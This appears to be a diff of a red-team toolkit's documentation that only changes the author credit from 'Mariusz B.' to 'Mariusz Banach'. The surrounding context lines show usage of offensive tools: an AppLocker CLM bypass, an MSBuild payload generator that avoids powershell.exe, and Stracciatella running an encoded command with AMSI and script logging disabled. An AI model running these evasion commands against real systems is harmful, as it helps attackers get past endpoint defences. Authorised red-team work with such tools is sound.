@@ -15,7 +15,7 @@ PS > .\Bypass-CLM.ps1
         (implementation of: @xpn's technique, as documented in:)
         (https://www.mdsec.co.uk/2018/09/applocker-clm-bypass-via-com/)
 
-        Re-implemented, enhanced by: Mariusz B., mgeeky
+        Re-implemented, enhanced by: Mariusz Banach, mgeeky
         -----
 
 [.] Step 0. Planted DLL files in:
@@ -180,7 +180,7 @@ C:\Users\IEUser\Desktop\files\video>python generateMSBuildXML.py     Show-Msgbox
 
         :: Powershell via MSBuild inline-task XML payload generation script
         To be used during Red-Team assignments to launch Powershell payloads without using 'powershell.exe'
-        Mariusz B. / mgeeky, <mb@binary-offensive.com>
+        Mariusz Banach / mgeeky, <mb@binary-offensive.com>
 
 [?] File not recognized as PE/EXE.
 
@@ -189,7 +189,7 @@ C:\Users\IEUser\Desktop\files\video>python generateMSBuildXML.py     Show-Msgbox
 
   <!--  Based on Casey Smith work, Twitter: @subTee                              -->
   <!--  Automatically generated using `generateMSBuildXML.py` utility  -->
-  <!--  by Mariusz B. / mgeeky <mb@binary-offensive.com>                         -->
+  <!--  by Mariusz Banach / mgeeky <mb@binary-offensive.com>                         -->
 
   <Target Name="btLDoraXcZV">
     <hwiJYmWvD />
@@ -237,7 +237,7 @@ C:\Users\IEUser\Desktop\files\video>python generateMSBuildXML.py Show-Msgbox.ps1
                                                                                                                   
         :: Powershell via MSBuild inline-task XML payload generation script                                       
         To be used during Red-Team assignments to launch Powershell payloads without using 'powershell.exe'       
-        Mariusz B. / mgeeky, <mb@binary-offensive.com>                                                                
+        Mariusz Banach / mgeeky, <mb@binary-offensive.com>                                                                
                                                                                                                   
 [?] File not recognized as PE/EXE.                                                                                    
                                                                                                                   
@@ -363,7 +363,7 @@ SharpWebServer [29.03.21, 17:55:14] ::1 - "GET /test.txt" - len: 11 (200)
 PS D:\> Stracciatella.exe -v -b -x 0x31 -c "ZkNYRVQceV5CRRETeEURRl5DWkIRXVhaVBFQEVJZUENcEBMRChEVdElUUkRFWF5fcl5fRVRJRR9iVEJCWF5fYkVQRVQffVBfVkRQVlR8XlVU" .\Test2.ps1
 
   :: Stracciatella - Powershell runspace with AMSI and Script Block Logging disabled.
-  Mariusz B. / mgeeky, '19 <mb@binary-offensive.com>
+  Mariusz Banach / mgeeky, '19 <mb@binary-offensive.com>
 
 [.] Will load script file: '.\Test2.ps1'
 [+] AMSI Disabled.
@@ -395,7 +395,7 @@ This script contains malicious content and has been blocked by your antivirus so
 PS D:\> .\Stracciatella.exe -v
 
   :: Stracciatella - Powershell runspace with AMSI and Script Block Logging disabled.
-  Mariusz B. / mgeeky, '19 <mb@binary-offensive.com>
+  Mariusz Banach / mgeeky, '19 <mb@binary-offensive.com>
 
 [-] It looks like no script path was given.
 [+] AMSI Disabled.
